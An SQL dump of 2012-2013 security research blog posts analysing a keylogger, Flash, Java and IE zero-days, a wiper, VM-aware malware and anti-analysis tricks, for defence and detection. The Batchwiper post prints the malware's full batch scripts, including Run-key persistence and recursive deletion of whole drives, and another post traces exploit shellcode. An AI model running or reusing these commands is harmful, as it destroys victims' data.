INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (73, 'Set up your keylogger to report by email? Bad idea! (The case of Ardamax)', 'Alberto Ortega', 'February 11, 2013 ', 'A couple of days ago, I was surfing our wild Internet when I came up with a dirty piece of software dedicated to steal accounts of a popular build-with-bricks videogame.The program offered a premium account of the videogame for free. The real fact is that it was a stealer, which installs a keylogger on your computer to record and send your private information to the bad actors.When the user executes the program, the keylogger silently installs itself and then hides its directories and processes. If we take a look at the installation directory, it has these files:d6192e6ac19bedf50772769568b8a1bf RKJ.00 (encrypted configuration file)c8602a35ed53655f62eb70e52627f7ef  RKJ.01 (aux exec file)cabd1ee6acc039dd33ba48f886f3b12d  RKJ.02 (aux exec file 2)29c88770640993a5f0df70bfa272bb09  RKJ.exe (main executable)It looks like an Ardamax Keylogger installation, latest version. This is a pretty popular keylogger among bad guys, it has trial and paid versions. It can monitor keystrokes, login credentials, clipboard and even take screenshots and pictures from the webcam.A couple of minutes after the infection, the machine started to connect to Google’s email server using an encrypted channel (SSL SMTP). Is the keylogger reporting results to the administrator using this? In that case, we could probably analyse the sample and get the email account credentials of the malware administrator.As the configuration file is encrypted, the easiest way to get some more information is by doing some reverse engineering. Let’s going to infect a machine, dump the memory (keylogger.mem) and analyse it with volatility.$ python vol.py -f keylogger.mem pslistThe keylogger process is hidden for Windows Task Manager, but volatility can show it to us.Offset(V)  Name                   PID   PPID   Thds0x862d6528 RKJ.exe                1832   1528      1Time to dump process memory.$ python vol.py -f keylogger.mem memdump -p 1832—dump-dir=/tmp/And if we carefully study the strings contained in that memory dump (take care of the encoding!)...$ strings -a—encoding=l 1832.dmp[...]Logs from “%USERNAME%[censored][email protected] —> usernamesmtp.googlemail.com —> password[...]Luckily Google had disabled the email account due to service abuse, no need to report the issue.What about the encrypted configuration file?We have seen some people infected by this keylogger wondering how to decrypt the file to see where is the malware leaking information to. Well, if you can not do memory analysis or some debugging it is quite easy to decrypt.After a quick cryptanalysis of the file, it is quite obvious that it is encrypted with XOR cipher or something similar. You can easily decrypt it by using a XOR analysis tool like xortool. Let’s give a try:$ python xortool.py -b keylogger/RKJ.00xortool will generate some output files with possible decryptions. In this case the 33rd file was the good shot, encrypted with key “Z|NY”. If we open it with an editor, we can see all configuration parameters and reporting credentials in plain text.Take care of the channels you allow on your network! We have seen how Google do a great job on cancelling accounts of this kind, but we should never have a blind faith on a legit connection because it could be a potential way to leak private information to the outside.', 'malwareardamax keyloggerkeyloggervolatilitystealer', '/blogs/labs-research/set-up-your-keylogger-to-report-by-email-bad-idea-the-case-of-ardamax');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (74, 'Adobe patches two vulnerabilities being exploited in the wild', 'Jaime Blasco', 'February 8, 2013 ', 'Yesterday, Adobe released a patch for Adobe Flash that fixed a zeroday vulnerability that was being exploited in the wild. According to Adobe,Â CVE-2013-0633 is being exploited using Microsoft Office files with embedded flash content delivered via email. They are also aware ofÂ CVE-2013-0634 being exploited trough web browsers such as Firefox and Safari on MacOSX. FireEye released some information a few hours ago.We found several Microsoft Office files containing the exploit that seems to be part of a spearphishing campaign targeting several industries including the aerospace one.One of the files was using the 2013 IEEE Aerospace Conference schedule as a lure to trick the user into opening the file. Here is the content displayed to the user.Another sample is related with an online payroll system used by several companies in the US.As we previously said, the .doc files contain an embedded flash file with no compression or obfuscation. The flash file has an embedded executable file that is the actual payload delivered to the victim. It is worth mentioning that the executable file isn’t obfuscated at all that means most of the security products should be able to detect this threat using generic signatures.The flash files contain several ActionScript classes that checks for specific Flash and operating system versions and specific code to trigger the exploit.\nThe code contains several references to “Lady Boyle” who is a character in the computer game Dishonored.One of the payloads used is an executable signed with a fake certificate from a South Korean company called MGAME. We have seen this certificate dozens of times in the past as part of targeted attacks including NGO’s to sign several RAT files including PlugX.The sample connects to ieee[.]boeing-job[.]com (C&C):Â We will keep you up to date as we discover new information related with this attack.', '0dayexploittargetedflashadobe', '/blogs/labs-research/adobe-patches-two-vulnerabilities-being-exploited-in-the-wild');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (75, 'Red October - Indicators of Compromise and Mitigation Data', 'Jaime Blasco', 'January 21, 2013 ', 'Together with our partner, Kaspersky, we’re releasingÂ a whitepaper on the âindicators of compromiseâ that can be useful to detect and mitigate the threats from Red October. It contains indicators to detect most of the Red October activity in your systems and networks. Inside the whitepaper you will find snort rules as well as an OpenIOC file that you can use to check your systems for activity related to this cyber espionageÂ campaign.Link to the whitepaperOpenIOC fileRead more from Red October', 'targeted attacksred octobercyberespionage', '/blogs/labs-research/red-october-indicators-of-compromise-and-mitigation-data');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (76, 'New year, new Java zeroday!', 'Jaime Blasco', 'January 10, 2013 ', 'Earlier this morning @Kafeine alerted us about a new Java zeroday being exploited in the wild. With the files we were able to obtain we reproduced the exploit in a fully patched new installation of Java. As you can see below we tricked the malicious Java applet to execute the calc.exe in our lab.The Java file is highly obfuscated but based on the quick analysis we did the exploit is probably bypassing certain security checks Â tricking the permissions of certain Java classes as we saw inÂ CVE-2012-4681Â .Right now the only way to protect your machine against this exploit is disabling the Java browser plugin. Let’s see how long does it take for Oracle to release a patch.On the other hand we expect a Metasploit module in the upcoming days as it has been happening during the last year as well as most of the exploit kits adopting this new zeroday sooner than later.We will keep you updated as we obtain more information.Be safe!Update: It seems both Blackhole and Nuclear Pack exploit kits are using this vulnerability in the wild', '0dayjavaoracle', '/blogs/labs-research/new-year-new-java-zeroday');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (77, 'Just another water hole campaign using an Internet Explorer 0day', 'Jaime Blasco', 'December 29, 2012 ', 'At the beginning of the week we started to analyze a water hole campaign that was present on theÂ Council on Foreign Relations (CFR) portal. After studying the attack and the payload and realizing that it was likely using a zeroday exploit against Internet Explorer, we Â sent the information toÂ Microsoft Security Response Center (MSRC) that is still investigating the issue. At the same time the issue was communicated toÂ CFR and other third parties that began to work on the issue so we decided to not release public details of this attack.It seems other researchers didn’t think the same and went public with this (http://freebeacon.com/chinese-hackers-suspected-in-cyber-attack-on-council-on-foreign-relations/) and this led to other companies blogging about this.Once the attack has been made public we have decided to public some useful details and information that can help companies to detect and respond against this incident.The malicious code we found in theÂ Council on Foreign Relations portal is a Javascript file that works as follow:- It first sets a cookie on the victim system to check if the same machine visited the link before:If it is not the first visit from that system the exploit won’t trigger:- The next check ensure that the victim is running Internet Explorer 8:- Since the exploit uses Flash to do the Heap Spray and build the shellcode, the code also checks that Adobe Flash is present on the browser:- Finally, it won’t continue if the browser language is not Chinese,Â Chinese (Taiwan), Japanese, Korean, or Russian:The vulnerability present in Internet Explore 8 seems to be a user-after-free. The exploit is able to exploit both Windows XP and Windows 7 bypassing bothÂ data execution (DEP) and address space layout randomization (ASLR) protections. The malicious code loads “ms-help:” in order to bypass ASLR on Windows 7 using the technique described here. We won’t release the piece of code that triggers the use-after-free since Microsoft is still investigating the issue and we don’t want public exploits to be released and compromise thousands of users.If the system is running Windows 7 it will also load Java since it requires the Java libraries to be loaded in order to leverageÂ return-oriented programming (ROP) chains to bypass protections.In the case that Windows XP is used it doesn’t load Java since it is not required to perform the exploitation:Once the Flash file is loaded it will perform the Heap Spray and it will build the shellcode based on the system’s language and operating system supporting the following ones:(flash.system.Capabilities.language.toLowerCase() == “zh-cn” && this.OS_Version == “windows xp”)(flash.system.Capabilities.language.toLowerCase() == “zh-tw” && this.OS_Version == “windows xp”)(flash.system.Capabilities.language.toLowerCase() == “en” && this.OS_Version == “windows xp”)(flash.system.Capabilities.language.toLowerCase() == “ja” && this.OS_Version == “windows xp”)(flash.system.Capabilities.language.toLowerCase() == “ko” && this.OS_Version == “windows xp”)(flash.system.Capabilities.language.toLowerCase() == “ru” && this.OS_Version == “windows xp”)(this.OS_Version == “windows 7” && loc6 == “default”)(this.OS_Version == “windows 7” && loc6 == “false”)(this.OS_Version == “windows 7” && loc6 == “true”)The shellcode used is very tricky, firstÂ the javascript has downloaded a file as seen in the code:Lets follow the execution of the shellcode:Using base offset: 0x40100040122a Â LoadLibraryA(shell32)401246 Â SHGetSpecialFolderPathA(buf=12ff00, C:\\Documents and Settings\\user1\\ConfiguraciÂ¾n local\\Archvos temporales de Internet)4012a2 Â GetTempPath(len=100, buf=130000) = 204012da Â CopyFileA(C:\\Documents and Settings\\user1\\ConfiguraciÂ¾n local\\Archivos temporales de Interne\\Content.IE5\\index.dat, C:\\DOCUME~1\\user1\\CONFIG~1\\Temp\\qwea.dat)4012fb Â CreateFileA(C:\\DOCUME~1\\user1\\CONFIG~1\\Temp\\qwea.dat) = 7ac40131b Â SetFilePointer(hFile=7ac, dist=50, 0, FILE_BEGIN) = 5040133c Â ReadFile(hFile=7ac, buf=130100, numBytes=80) = 140134b Â CloseHandle(7ac)40150b Â CreateFileA(C:\\Documents and Settings\\user1\\ConfiguraciÂ¾n local\\Archivos temporales de Interet\\Content.IE5\\xâº?) = 7ac4013a3 Â GetFileSize(7ac, 12fe78) = 04013ec Â CreateFileA(C:\\DOCUME~1\\user1\\CONFIG~1\\Temp\\flowertep.jpg) = 7a8401428 Â ReadFile(hFile=7ac, buf=12f9f4, numBytes=400) = 1401477 Â  E2EB Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â loop 0x401464 Â step: 1075000401464 Â  807C0FFF83 Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â cmp byte [edi+ecx-0x1],0x83401469 Â  740C Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â jz 0x40147740146b Â  807C0FFF00 Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â cmp byte [edi+ecx-0x1],0x0401470 Â  7405 Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â jz 0x401477401477 Â  E2EB Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â loop 0x401464 Â step: 1075005401464 Â  807C0FFF83 Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â cmp byte [edi+ecx-0x1],0x83401469 Â  740C Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â jz 0x40147740146b Â  807C0FFF00 Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â cmp byte [edi+ecx-0x1],0x0401470 Â  7405 Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â jz 0x401477401477 Â  E2EB Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â loop 0x401464 Â step: 1075010401464 Â  807C0FFF83 Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â cmp byte [edi+ecx-0x1],0x83401469 Â  740C Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â jz 0x40147740146b Â  807C0FFF00 Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â cmp byte [edi+ecx-0x1],0x0401470 Â  7405 Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â jz 0x401477401477 Â  E2EB Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â loop 0x401464 Â step: 1075015........401466 Â WriteFile(h=7a8, buf=12f9f4, len=0, lpw=12fe74, lap=0) = 1401486 Â CloseHandle(7ac)401495 Â CloseHandle(7a8)4014a3 Â LoadLibraryA(C:\\DOCUME~1\\user1\\CONFIG~1\\Temp\\flowertep.jpg)4014d8 Â  E9C0000000 Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â jmp 0x40159d Â step: 107596540159d Â  8B7650 Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â mov esi,[esi+0x50]4015a0 Â  8BBE0C020000 Â  Â  Â  Â  Â  Â  Â  Â  Â  Â mov edi,[esi+0x20c]4015a6 Â  8B9E08020000 Â  Â  Â  Â  Â  Â  Â  Â  Â  Â mov ebx,[esi+0x208]4015ac Â  8B8610020000 Â  Â  Â  Â  Â  Â  Â  Â  Â  Â mov eax,[esi+0x210]4015b2 Â  B952000000 Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â mov ecx,0x52 Â step: 10759704015b7 Â  05BC040000 Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â add eax,0x4bc4015bc Â  94 Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â xchg eax,esp4015bd Â  807C240340 Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â cmp byte [esp+0x3],0x404015c2 Â  7203 Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â jc 0x4015c74015c7 Â  33C0 Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â xor eax,eax Â step: 10759754015c9 Â  8BF0 Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â mov esi,eax4015cb Â  8BD0 Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â mov edx,eax4015cd Â  8B2C24 Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â mov ebp,[esp]4015d0 Â  83C404 Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â add esp,0x44015d3 Â  C20400 Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â retn 0x4 Â step: 1075980Basically the shellcode performs the following:- It checks the path for theÂ Temporary Internet Explorer Files folder- It uses index.dat and looks for the path of the file previously downloaded (xsainfo.jpg).- It creates the fileÂ flowertep.jpg- It readsÂ xsainfo.jpg and performs a XOR “0x83” operation ignoring the bytes that contain “0x00” or “0x083”.- It writes the the result of the XOR operation onÂ flowertep.jpg.- It usesÂ LoadLibraryAÂ to loadÂ flowertep.jpgÂ that contains the malicious DLL payload.Once the payload is executed it will be implanted on the system and it will try to contact the C&C server using a binary protocol through HTTP:We have released an OpenIOC file that contains some indicators of compromise that you can use to detect the attack on your systems:We recommend to use these indicators of compromise to check the presence of the malicious payload in your system. Hopefully Microsoft will release a patch soon but once again we recommend you to:- Maintain your system up to date- Not use Flash, Java and other third party applications in your browser if you don’t use it.Happy hunting!', 'internet explorerzerodaywaterhole', '/blogs/labs-research/just-another-water-hole-campaign-using-an-internet-explorer-0day');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (78, 'Hardening Cuckoo Sandbox against VM aware malware', 'Alberto Ortega', 'December 19, 2012 ', 'Some time ago, we wrote a post about how a lot of malware samples check the execution environment, and if it is unwanted (VM, debugger, sandbox, ...) the execution unexpectedly finishes.We use Cuckoo Sandbox in the lab for our analysis tasks, we really love how customizable it is.Sometimes we have to deal with malware aware of the execution environment, and this is a problem when you are using public virtualization products. Let’s see how modifying some parts of cuckoo we are able to fake crucial parts of the system to the malware sample, so it will not be able to detect the VM (in this case, VirtualBox).Pafish will help us to test our work, it is a demo tool that performs some anti(debugger/VM/sandbox) tricks, most of them often used by malware. When it is executed, it writes a log with the successful detections, so we can easily track and solve them.To monitor the malware activity, cuckoo executes the sample with cuckoomon, the part responsible of hooking system calls to save the malware actions. With this powerful hooking system, we can modify the hooks to return fake responses if we do not like the call. For example, calls to check files / registry keys / processes to detect the VM.When we execute pafish for the first time, it will detect VirtualBox using different tricks:[pafish] Start\n\n[pafish] Windows version: 5.1 build 2600\n\n[pafish] Sandbox traced using mouse activity\n\n[pafish] VirtualBox traced using Reg key HKLM\\HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0 \"Identifier\"\n\n[pafish] VirtualBox traced using Reg key HKLM\\HARDWARE\\Description\\System \"SystemBiosVersion\"\n\n[pafish] VirtualBox traced using Reg key HKLM\\SOFTWARE\\Oracle\\VirtualBox Guest Additions\n\n[pafish] VirtualBox traced using file C:\\WINDOWS\\system32\\drivers\\VBoxMouse.sys\n\n[pafish] EndAs we can see, it has detected our VM by reading some registry keys and looking for a file.The piece of code responsible of hook RegOpenKeyExA (the call used by the detection) is this one (hook_reg.c):HOOKDEF(LONG, WINAPI, RegOpenKeyExA,\n\n  __in        HKEY hKey,\n\n  __in_opt    LPCTSTR lpSubKey,\n\n  __reserved  DWORD ulOptions,\n\n  __in        REGSAM samDesired,\n\n  __out       PHKEY phkResult\n\n) {\n\n    LONG ret = Old_RegOpenKeyExA(hKey, lpSubKey, ulOptions, samDesired,\n\n        phkResult);\n\n    LOQ(\"psP\", \"Registry\", hKey, \"SubKey\", lpSubKey, \"Handle\", phkResult);\n\n    return ret;\n\n}So we can modify it:/* Hardened */\n\nHOOKDEF(LONG, WINAPI, RegOpenKeyExA,\n\n  __in        HKEY hKey,\n\n  __in_opt    LPCTSTR lpSubKey,\n\n  __reserved  DWORD ulOptions,\n\n  __in        REGSAM samDesired,\n\n  __out       PHKEY phkResult\n\n) {\n\n    LONG ret;\n\n    if (strstr(lpSubKey, \"VirtualBox\") != NULL) {\n\n        ret = 1;\n\n        LOQ(\"s\", \"Hardening\", \"Faked RegOpenKeyExA return\");\n\n    }\n\n    else if (strstr(lpSubKey, \"ControlSet\") != NULL) {\n\n        ret = 1;\n\n        LOQ(\"s\", \"Hardening\", \"Faked RegOpenKeyExA return\");\n\n    }\n\n    else {\n\n        ret = Old_RegOpenKeyExA(hKey, lpSubKey, ulOptions, samDesired,\n\n            phkResult);\n\n    }\n\n    LOQ(\"psP\", \"Registry\", hKey, \"SubKey\", lpSubKey, \"Handle\", phkResult);\n\n    return ret;\n\n}We have changed the code to check if “VirtualBox” or “ControlSet” is in the provided SubKey to read. If it is, we will log a Hardening warning in cuckoo log and fake the response.We have to do the same with RegQueryValueExA:HOOKDEF(LONG, WINAPI, RegQueryValueExA,\n\n  __in         HKEY hKey,\n\n  __in_opt     LPCTSTR lpValueName,\n\n  __reserved   LPDWORD lpReserved,\n\n  __out_opt    LPDWORD lpType,\n\n  __out_opt    LPBYTE lpData,\n\n  __inout_opt  LPDWORD lpcbData\n\n) {\n\n    LONG ret = Old_RegQueryValueExA(hKey, lpValueName, lpReserved, lpType,\n\n        lpData, lpcbData);\n\n    LOQ(\"psLB\", \"Handle\", hKey, \"ValueName\", lpValueName,\n\n        \"Type\", lpType, \"Buffer\", lpcbData, lpData);\n\n    return ret;\n\n}We change it to:/* Hardened */\n\nHOOKDEF(LONG, WINAPI, RegQueryValueExA,\n\n  __in         HKEY hKey,\n\n  __in_opt     LPCTSTR lpValueName,\n\n  __reserved   LPDWORD lpReserved,\n\n  __out_opt    LPDWORD lpType,\n\n  __out_opt    LPBYTE lpData,\n\n  __inout_opt  LPDWORD lpcbData\n\n) {\n\n    LONG ret;\n\n    if (strstr(lpValueName, \"SystemBiosVersion\") != NULL) {\n\n        ret = ERROR_SUCCESS;\n\n        LOQ(\"s\", \"Hardening\", \"Faked RegQueryValueExA return\");\n\n    }\n\n    else if (strstr(lpValueName, \"Identifier\") != NULL) {\n\n        ret = ERROR_SUCCESS;\n\n        LOQ(\"s\", \"Hardening\", \"Faked RegQueryValueExA return\");\n\n    }\n\n    else if (strstr(lpValueName, \"ProductId\") != NULL) {\n\n        ret = ERROR_SUCCESS;\n\n        LOQ(\"s\", \"Hardening\", \"Faked RegQueryValueExA return\");\n\n    }\n\n    else {\n\n        ret = Old_RegQueryValueExA(hKey, lpValueName, lpReserved, lpType,\n\n            lpData, lpcbData);\n\n    }\n\n    LOQ(\"psLB\", \"Handle\", hKey, \"ValueName\", lpValueName,\n\n        \"Type\", lpType, \"Buffer\", lpcbData, lpData);\n\n    return ret;\n\n}If the malware sample tries to read a registry key with “SystemBiosVersion”, “Identifier” or “ProductId” in the value name, it will fail.With these two changes, we have covered the two registry keys detections done by pafish. Then we have to change the call used to access the files.The call used is GetFileAttributesA, which is not hooked by default, so we add it (hook_file.c):/* Hardened */\n\nHOOKDEF(DWORD, WINAPI, GetFileAttributesA,\n\n  __in      LPCTSTR lpFileName\n\n) {\n\n    BOOL ret;\n\n    if (strstr(lpFileName, \"VBox\") != NULL) {\n\n        ret = INVALID_FILE_ATTRIBUTES;\n\n        LOQ(\"s\", \"Hardening\", \"Faked GetFileAttributesA return\");\n\n    }\n\n    else {\n\n        ret = Old_GetFileAttributesA(lpFileName);\n\n    }\n\n    LOQ(\"s\", \"GetFileAttributesA\", lpFileName);\n\n    return ret;\n\n}After that, we have to compile our new cuckoomon.dll and replace the original.You can find it in cuckoo/analyzer/windows/dll/cuckoomon.dll, you can replace it while cuckoo is running, no need to stop it.And we are done, we have placed some measures to disallow the samples to detect our VM by using these functions. We can execute pafish again with our new cuckoomon.dll to check the results:[pafish] Start\n\n[pafish] Windows version: 5.1 build 2600\n\n[pafish] Sandbox traced using mouse activity\n\n[pafish] EndIt only traced our VM by using the mouse activity, we could hook that too. We can also take a look at cuckoo log to see the responses faked by our hardened monitor:\"pafish.exe\",\"620\",\"532\",\"registry\",\"RegOpenKeyExA\",\"SUCCESS\",\"0x00000000\",\"Registry->0x80000002\",\"SubKey->HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0\",\"Handle->0x0000003c\"\n\n\"pafish.exe\",\"620\",\"532\",\"registry\",\"RegQueryValueExA\",\"SUCCESS\",\"0x00000000\",\"Hardening->Faked RegQueryValueExA return\"\n\n\"pafish.exe\",\"620\",\"532\",\"registry\",\"RegQueryValueExA\",\"SUCCESS\",\"0x00000000\",\"Handle->0x0000003c\",\"ValueName->Identifier\",\"Type->0\",\"Buffer->0x0022f64c\"\n\n\"pafish.exe\",\"620\",\"532\",\"registry\",\"RegOpenKeyExA\",\"SUCCESS\",\"0x00000000\",\"Registry->0x80000002\",\"SubKey->HARDWARE\\Description\\System\",\"Handle->0x00000040\"\n\n\"pafish.exe\",\"620\",\"532\",\"registry\",\"RegQueryValueExA\",\"SUCCESS\",\"0x00000000\",\"Hardening->Faked RegQueryValueExA return\"\n\n\"pafish.exe\",\"620\",\"532\",\"registry\",\"RegQueryValueExA\",\"SUCCESS\",\"0x00000000\",\"Handle->0x00000040\",\"ValueName->SystemBiosVersion\",\"Type->0\",\"Buffer->0x0022f64c\"\n\n\"pafish.exe\",\"620\",\"532\",\"registry\",\"RegOpenKeyExA\",\"FAILURE\",\"0x00000001\",\"Hardening->Faked RegOpenKeyExA return\"\n\n\"pafish.exe\",\"620\",\"532\",\"registry\",\"RegOpenKeyExA\",\"FAILURE\",\"0x00000001\",\"Registry->0x80000002\",\"SubKey->SOFTWARE\\Oracle\\VirtualBox Guest Additions\",\"Handle->0x77c05c94\"\n\n\"pafish.exe\",\"620\",\"532\",\"filesystem\",\"GetFileAttributesA\",\"FAILURE\",\"0xffffffff\",\"Hardening->Faked GetFileAttributesA return\"\n\n\"pafish.exe\",\"620\",\"532\",\"filesystem\",\"GetFileAttributesA\",\"FAILURE\",\"0xffffffff\",\"GetFileAttributesA->C:\\WINDOWS\\system32\\drivers\\VBoxMouse.sys\"It is quite difficult to cover all functions used by malware to detect VMs, but with modifications in some common functions we can cover ~90% of the cases.You can download the modifications made in this post from here, it is a patch compatible with the last stable version of the software. You can also download the compiled library, ready to use in your cuckoo installation.', 'malwaresandboxvmdebuggingcuckoopafish', '/blogs/labs-research/hardening-cuckoo-sandbox-against-vm-aware-malware');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (79, 'Batchwiper: Just Another Wiping Malware', 'Jaime Blasco', 'December 17, 2012 ', 'A few days ago, The Iranian CERT (Maher Center) released information about a new identified targeted malware with wiping capabilities. The piece of code is very simple and it deletes files on different drives on specific dates.The original dropper is a self-extracting RAR file with the name GrooveMonitor.exe. Once executed it extracts the following files:\\WINDOWS\\system32\\SLEEP.EXE, md5: ea7ed6b50a9f7b31caeea372a327bd37\\WINDOWS\\system32\\jucheck.exe, md5: c4cd216112cbc5b8c046934843c579f6\\WINDOWS\\system32\\juboot.exe, md5: fa0b300e671f73b3b0f7f415ccbe9d41The juboot.exe is executed. The following bat file is created and executed:\\Documents and Settings\\%User%\\Local Settings\\Temp\\1.tmp\\juboot.bat@echo off & setlocalsleep for 2REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v jucheck.exe /t REG_SZ /d “%systemroot%\\system32\\jucheck.exe” /fstart “” /D”%systemroot%\\system32\\” “jucheck.exe”As you can see the bat file uses reg.exe to create a registry key that the malware uses to maintain persistence executing the jucheck.exe file everytime the system boots.Then jucheck.exe is executed that creates the file \\Documents and Settings\\Administrator\\Local Settings\\Temp\\4.tmp\\jucheck.bat:@echo off & setlocalsleep for 2del “%systemroot%\\system32\\juboot.exe” /q /s /fdel “%userprofile%\\Start Menu\\Programs\\Startup\\GrooveMonitor.exe” /q /s /fif “%date%”==“Mon 12/10/2012” goto yesif “%date%”==“Tue 12/11/2012” goto yesif “%date%”==“Wed 12/12/2012” goto yesif “%date%”==“Mon 01/21/2013” goto yesif “%date%”==“Tue 01/22/2013” goto yesif “%date%”==“Wed 01/23/2013” goto yesif “%date%”==“Mon 05/06/2013” goto yesif “%date%”==“Tue 05/07/2013” goto yesif “%date%”==“Wed 05/08/2013” goto yesif “%date%”==“Mon 07/22/2013” goto yesif “%date%”==“Tue 07/23/2013” goto yesif “%date%”==“Wed 07/24/2013” goto yesif “%date%”==“Mon 11/11/2013” goto yesif “%date%”==“Tue 11/12/2013” goto yesif “%date%”==“Wed 11/13/2013” goto yesif “%date%”==“Mon 02/03/2014” goto yesif “%date%”==“Tue 02/04/2014” goto yesif “%date%”==“Wed 02/05/2014” goto yesif “%date%”==“Mon 05/05/2014” goto yesif “%date%”==“Tue 05/06/2014” goto yesif “%date%”==“Wed 05/07/2014” goto yesif “%date%”==“Mon 08/11/2014” goto yesif “%date%”==“Tue 08/12/2014” goto yesif “%date%”==“Wed 08/13/2014” goto yesif “%date%”==“Mon 02/02/2015” goto yesif “%date%”==“Tue 02/03/2015” goto yesif “%date%”==“Wed 02/04/2015” goto yesgoto no:yessleep for 3000IF EXIST d:\\ del “d:\\*.*” /q /s /fIF EXIST d:\\ Chkdsk d:IF EXIST e:\\ del “e:\\*.*” /q /s /fIF EXIST e:\\ Chkdsk e:IF EXIST f:\\ del “f:\\*.*” /q /s /fIF EXIST f:\\ Chkdsk f:IF EXIST g:\\ del “g:\\*.*” /q /s /fIF EXIST g:\\ Chkdsk g:IF EXIST h:\\ del “h:\\*.*” /q /s /fIF EXIST h:\\ Chkdsk h:IF EXIST i:\\ del “i:\\*.*” /q /s /fIF EXIST i:\\ Chkdsk i:del “%userprofile%\\Desktop\\*.*” /q /s /f\\\\start calc:noAs you can see when the bat file is executed, the juboot.exe file is deleted as well as the GrooveMonitor.exe executable that resides in the Start Menu folder. Then the bat files checks the system date and if it matches one of the predefined dates  it executes the wiping routine. This routine checks for system drives and it then deletes every file on those drives. Finally it deletes the userprofile folder.We don’t have details about the infection vector but based on the dropper it could be deployed using USB drives, internal actors, SpearPhishing or probably as the second stage of a targeted intrusion.We have built some OpenIOC indicators that you can access here.', 'wipermaheriran', '/blogs/labs-research/batchwiper-just-another-wiping-malware');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (80, 'Your malware shall not fool us with those anti analysis tricks', 'Alberto Ortega', 'November 5, 2012 ', 'It is well known that a big amount of malware samples are aware of the execution environment. This means that a malware sample can change his behavior if it detects that the running environment is unwanted.There are resources, public source code, and even programs that detail how to bypass automatic malware analysis systems and make things awkward for malware researchers. Of course, these resources are quite useful for both researchers and malware developers.We are going to take a look at some of these tricks, all found in real malware samples.Also, just as they do, we have developed some yara signatures to detect these tricks that could be useful to differently process or classify these malware samples.We could classify anti analysis tricks in three big groups:- Anti Virtual Machine, that tries to detect if the execution environment is a known VM or emulator.- Anti Debugging, that tries to detect if the program is running under the surveillance of a debugger.- Anti Sandbox, that tries to detect known sandboxing products.It is not unusual to find all kind of tricks in just one malware sample. For example, we can take a look at the sample 9255c75de8fbc20ee67f427397e1ef82:Quickly we can find that it is looking for sbiedll.dll (to detect Sandboxie) and dbghelp.dll\nIt also opens the registry key HKLM\\SYSTEM\\ControlSet001\\Services\\Disk\\Enum with value 0 to read the ID of the hard disk in the machine:\nThen it is compared with these three strings (VIRTUAL, VMWARE, VBOX):\nFinally, it opens the registry key HKLM\\Software\\Microsoft\\Windows\\CurrentVersion with value ProductId:\nAnd checks it against these three known MS Windows products ID from different commercial sandboxes:\nIf we take a look at another sample (36527d5954bf3b2af60e6efa6398ccff), we will discover a canonical function to check this:\nIt checks the MS Windows product ID and if it is “76487-644-3177037-23510”, the function will return 1. Else, it will return 0. It also has the same function prototype to check keys “55274-640-2673064-23950” and “76487-337-8429955-22614”.This sample also uses MS Windows system functions to detect debugging.\nIt loads the function handler for IsDebuggerPresent using the function GetProcAddress() from kernel32.dll. Hey wait! And why not use IsDebuggerPresent() directly? Because it is noisy and easily detectable.If it can not load the function or the function returns 0 (debugger not present), it will return 0. Else, it will return nonzero.It also looks for files (SyserDbgMsg / SyserBoot) and (SICE / NTICE) using this function:\nThis trick is to detect both SyserDebugger and SoftICE debuggers.As we said, we have published a ruleset of yara signatures to detect AntiVM, AntiDebugger and AntiSandbox procedures in malware samples. You can grab it in our GitHub repository here.', 'malwareyarasandboxvmreversingdebuggingsignatures', '/blogs/labs-research/your-malware-shall-not-fool-us-with-those-anti-analysis-tricks');
